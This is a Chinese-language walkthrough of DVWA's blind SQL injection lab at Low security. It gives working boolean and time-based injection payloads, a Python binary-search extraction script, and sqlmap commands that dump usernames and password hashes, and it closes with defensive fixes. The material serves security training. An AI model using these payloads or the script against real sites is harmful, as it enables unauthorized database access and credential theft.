# DVWA SQL Injection (Blind) Low 通关 WriteUp

## 一、漏洞概述

DVWA 的 **SQL Injection (Blind)** 模块与普通 SQL 注入的区别在于：页面不会直接回显查询结果，只会根据查询是否命中返回两种固定提示：

- `User ID exists in the database.`
- `User ID is MISSING from the database.`

因此无法使用 `UNION SELECT` 直接回显数据，只能通过构造真/假条件，根据页面返回的不同提示来逐位推断数据。这种注入方式称为**布尔盲注**。

将 DVWA 安全级别设置为 **Low**，进入 SQL Injection (Blind) 模块。

## 二、源码分析

查看 Low 级别源码：

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($connection, $query);
$num = mysqli_num_rows($result);

if ($num > 0) {
    echo "<pre>User ID exists in the database.</pre>";
} else {
    echo "<pre>User ID is MISSING from the database.</pre>";
}
```

关键点：

1. `id` 参数通过 **GET** 方式提交，未经过任何过滤。
2. SQL 语句中 `$id` 被单引号包裹，属于**字符型注入**。
3. 页面只返回“存在”或“不存在”，不返回具体数据，属于典型的**布尔盲注**场景。

## 三、判断注入类型与闭合方式

在 URL 中提交：

```text
http://靶机IP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit
```

页面返回 `User ID exists in the database.`。

提交：

```text
?id=1' and 1=1#
```

返回 `User ID exists in the database.`。

提交：

```text
?id=1' and 1=2#
```

返回 `User ID is MISSING from the database.`。

说明单引号闭合有效，且 `#` 注释生效，注入点存在。

> 如果 `#` 在 URL 中失效，可改用 `--+` 或 `%23`。

## 四、手工布尔盲注完整流程

### 1\. 获取当前数据库名长度

Payload：

```sql
1' and length(database())=4#
```

返回“存在”，说明数据库名长度为 4。  
可结合二分法加速：

```sql
1' and length(database())>3#
1' and length(database())<5#
```

最终确定长度为 **4**。

### 2\. 逐字符猜解数据库名

使用 `substr()` 和 `ascii()` 函数：

```sql
1' and ascii(substr(database(),1,1))=100#
```

- 如果返回“存在”，说明数据库名第一个字符的 ASCII 码为 100，即 `d`。
- 否则继续调整数值，直到命中。

依次猜解第 2、3、4 个字符：

```sql
1' and ascii(substr(database(),2,1))=118#   -- v
1' and ascii(substr(database(),3,1))=119#   -- w
1' and ascii(substr(database(),4,1))=97#    -- a
```

得到数据库名：**dvwa**。

> 实际手工注入时可使用二分法：先判断 `ascii(...) > 100`，逐步缩小范围，减少请求次数。

### 3\. 猜解表名

首先获取表的数量：

```sql
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
```

返回“存在”，说明当前数据库有 2 张表。

接着猜解第一张表的长度：

```sql
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9#
```

逐字符猜解表名：

```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#
```

重复操作，可得到表名，其中包含 `users` 表。

> 也可直接用 `group_concat` 配合 `like` 判断是否存在某表：
>
> ```sql
> 1' and (select table_name from information_schema.tables where table_schema=database() and table_name='users')='users'#
> ```

### 4\. 猜解字段名

获取 `users` 表的字段数量：

```sql
1' and (select count(column_name) from information_schema.columns where table_name='users')=8#
```

逐字符猜解字段名，例如判断是否存在 `user` 字段：

```sql
1' and (select column_name from information_schema.columns where table_name='users' limit 0,1)='user_id'#
```

或者使用 ASCII 逐位猜解：

```sql
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117#
```

最终可得到关键字段：`user`、`password`。

### 5\. 提取用户名与密码

#### 猜解用户名数量

```sql
1' and (select count(user) from users)=5#
```

#### 猜解第一个用户名的长度

```sql
1' and length((select user from users limit 0,1))=5#
```

#### 逐字符猜解用户名

```sql
1' and ascii(substr((select user from users limit 0,1),1,1))=97#   -- a
1' and ascii(substr((select user from users limit 0,1),2,1))=100#  -- d
...
```

#### 猜解密码哈希

密码为 MD5 格式，长度固定为 32 位：

```sql
1' and length((select password from users limit 0,1))=32#
```

逐字符猜解：

```sql
1' and ascii(substr((select password from users limit 0,1),1,1))=53#   -- 5
1' and ascii(substr((select password from users limit 0,1),2,1))=102#  -- f
...
```

最终可得到 `admin` 用户的密码哈希，再通过 MD5 解密网站还原明文。

## 五、二分查找在盲注中的应用

前面所有 Payload 都写成 `ascii(...)=100` 或 `length(...)=4` 这种“**等值判断**”形式。手工注入时可以这样逐个试，但当数据量变大、字符变多时，请求次数会急剧上升。**二分查找（Binary Search）** 就是用来把这个过程显著提速的核心算法。

### 1\. 为什么需要二分查找

以猜解数据库名长度为例，假设最大长度不超过 50。

**暴力遍历**：从 1 试到 50，最坏情况需要 50 次请求。

```sql
1' and length(database())=1#
1' and length(database())=2#
...
1' and length(database())=50#
```

**二分查找**：每次砍掉一半，最多约 `log2(50) ≈ 6` 次请求。

```sql
1' and length(database())>25#   -- 假，范围缩到 1~25
1' and length(database())>12#   -- 假，范围缩到 1~12
1' and length(database())>6#    -- 假，范围缩到 1~6
1' and length(database())>3#    -- 真，范围缩到 4~6
1' and length(database())>4#    -- 假，范围缩到 4~4
1' and length(database())>5#    -- 假
→ 长度 = 4
```

用 6 次请求替代 50 次，效率提升非常明显。

### 2\. 二分查找的算法逻辑

二分查找的本质是：**在有序区间内不断折半，用“大于”条件判断目标值落在左半区还是右半区。**

对于长度猜解，区间是 `[1, max_len]`，判断条件是：

```sql
length(expr) > mid
```

- 如果返回“存在”（条件为真），说明目标长度在 `(mid, high]` 区间；
- 如果返回“不存在”（条件为假），说明目标长度在 `[low, mid]` 区间。

循环直到 `low == high`，此时 `low` 就是目标长度。

对于字符猜解，区间是可打印 ASCII 范围 `[32, 126]`，判断条件是：

```sql
ascii(substr(expr, pos, 1)) > mid
```

- 条件为真 → ASCII 码在 `(mid, high]`；
- 条件为假 → ASCII 码在 `[low, mid]`。

循环结束后 `low` 就是该字符的 ASCII 码，`chr(low)` 即为对应字符。

### 3\. 伪代码

```text
函数 二分猜长度(表达式 expr):
    low = 1
    high = 50
    当 low < high:
        mid = (low + high) // 2
        如果 注入("length(expr) > mid"):
            low = mid + 1
        否则:
            high = mid
    返回 low

函数 二分猜字符(表达式 expr, 位置 pos):
    low = 32
    high = 126
    当 low < high:
        mid = (low + high) // 2
        如果 注入("ascii(substr(expr, pos, 1)) > mid"):
            low = mid + 1
        否则:
            high = mid
    返回 chr(low)
```

### 4\. Python 实现

下面是与本次 WriteUp 配套的 Python 脚本核心部分，完整使用了二分查找：

```python
import requests
import time

# ========== 配置区 ==========
TARGET = "http://192.168.153.131:8890/vulnerabilities/sqli_blind/"
COOKIES = {
    "PHPSESSID": "efb7qv5n5n77v4jqp6afhlh05n",
    "security": "low"
}
SUCCESS_TEXT = "User ID exists in the database."
# ============================


def inject(payload):
    """发送一次注入请求，返回 True 表示条件为真。"""
    params = {"id": payload, "Submit": "Submit"}
    try:
        r = requests.get(TARGET, params=params, cookies=COOKIES, timeout=10)
        return SUCCESS_TEXT in r.text
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


def get_length(expr, max_len=50):
    """用二分法猜解某个表达式的长度。"""
    low, high = 1, max_len
    while low < high:
        mid = (low + high) // 2
        payload = f"1' and length({expr})>{mid}#"
        if inject(payload):
            low = mid + 1
        else:
            high = mid
    return low


def get_char(expr, pos):
    """用二分法猜解 expr 第 pos 个字符的 ASCII 码。"""
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"1' and ascii(substr({expr},{pos},1))>{mid}#"
        if inject(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)


def get_string(expr, length):
    """逐字符猜解完整字符串。"""
    result = ""
    for i in range(1, length + 1):
        c = get_char(expr, i)
        result += c
        print(f"\r[*] 当前猜解: {result}", end="", flush=True)
    print()
    return result


def main():
    print("[*] 开始猜解数据库名...")
    db_len = get_length("database()")
    print(f"[+] 数据库名长度: {db_len}")
    db_name = get_string("database()", db_len)
    print(f"[+] 数据库名: {db_name}")


if __name__ == "__main__":
    start = time.time()
    main()
    print(f"[*] 耗时: {time.time() - start:.2f} 秒")
```

### 5\. 请求次数对比

以猜解数据库名 `dvwa`（长度 4）为例：

| 方法     | 长度猜解   | 每字符猜解       | 总请求次数（约）    |
| --- | --- | --- | --- |
| 暴力遍历 | 最多 50 次 | 每字符最多 95 次 | 50 + 4×95 = **430** |
| 二分查找 | 最多 6 次  | 每字符最多 7 次  | 6 + 4×7 = **34**    |

猜解一个 32 位 MD5 哈希时，差距更夸张：

| 方法     | 总请求次数（约）   |
| --- | --- |
| 暴力遍历 | 32 × 95 = **3040** |
| 二分查找 | 32 × 7 = **224**   |

这就是为什么所有自动化盲注工具（包括 sqlmap）都默认使用二分查找。手工盲注时，也应该养成用二分法的习惯，而不是从 `a` 一直试到 `z`。

### 6\. 手工二分法的实战写法

即使不写脚本，在浏览器或 Burp Repeater 里手工注入时，也可以用二分法。以猜解数据库名第一个字符为例：

```sql
1' and ascii(substr(database(),1,1))>100#   -- 真，目标在 101~126
1' and ascii(substr(database(),1,1))>113#   -- 假，目标在 101~113
1' and ascii(substr(database(),1,1))>107#   -- 假，目标在 101~107
1' and ascii(substr(database(),1,1))>104#   -- 假，目标在 101~104
1' and ascii(substr(database(),1,1))>102#   -- 假，目标在 101~102
1' and ascii(substr(database(),1,1))>101#   -- 假，目标 = 101?
1' and ascii(substr(database(),1,1))=100#   -- 确认为 100，即 'd'
```

最终确定第一个字符为 `d`（ASCII 100）。

## 六、时间盲注（补充）

如果页面无论真假都返回相同内容，无法使用布尔盲注，可改用时间盲注。MySQL 中可使用 `sleep()` 函数：

```sql
1' and if(length(database())=4,sleep(5),0)#
```

如果数据库名长度为 4，页面会延迟 5 秒返回；否则立即返回。  
通过响应时间差异判断条件真假，后续猜解流程与布尔盲注类似，同样可以使用二分法加速：

```sql
1' and if(ascii(substr(database(),1,1))>100,sleep(5),0)#
```

## 七、sqlmap 自动化利用

手工盲注效率较低，可使用 sqlmap 自动化：

```bash
sqlmap -u "http://靶机IP/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=你的会话ID; security=low" \
  --batch --dbs
```

后续可继续：

```bash
--tables -D dvwa
--columns -T users -D dvwa
--dump -T users -D dvwa
```

sqlmap 会自动识别布尔盲注类型，**内部默认采用二分查找加速猜解**，这也是它比手工快得多的原因之一。

## 八、漏洞成因与防御

**成因**：`id` 参数未经过滤直接拼接到 SQL 语句中，且页面通过查询结果是否存在来返回不同提示，导致攻击者可以利用布尔条件逐位推断数据库内容。

**防御措施**：

1. **参数化查询（首选）**  
   使用 PDO 或 MySQLi 预编译语句，将 SQL 结构与数据分离：
   ```php
    $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
    $stmt->execute([$id]);
   ```
2. **输入校验**  
   对 `id` 参数进行严格的类型检查，例如使用 `intval()` 强制转换为整数。
3. **统一错误与提示信息**  
   避免根据查询结果返回不同提示，减少攻击者可利用的信息差异。
4. **最小权限原则**  
   数据库账号只授予必要权限，避免攻击者通过 `information_schema` 获取过多信息。

盲注虽然利用成本较高，但在实际渗透中非常常见。理解布尔盲注的原理、手工流程以及二分查找的加速思路，有助于在无法直接回显的场景下高效完成数据提取。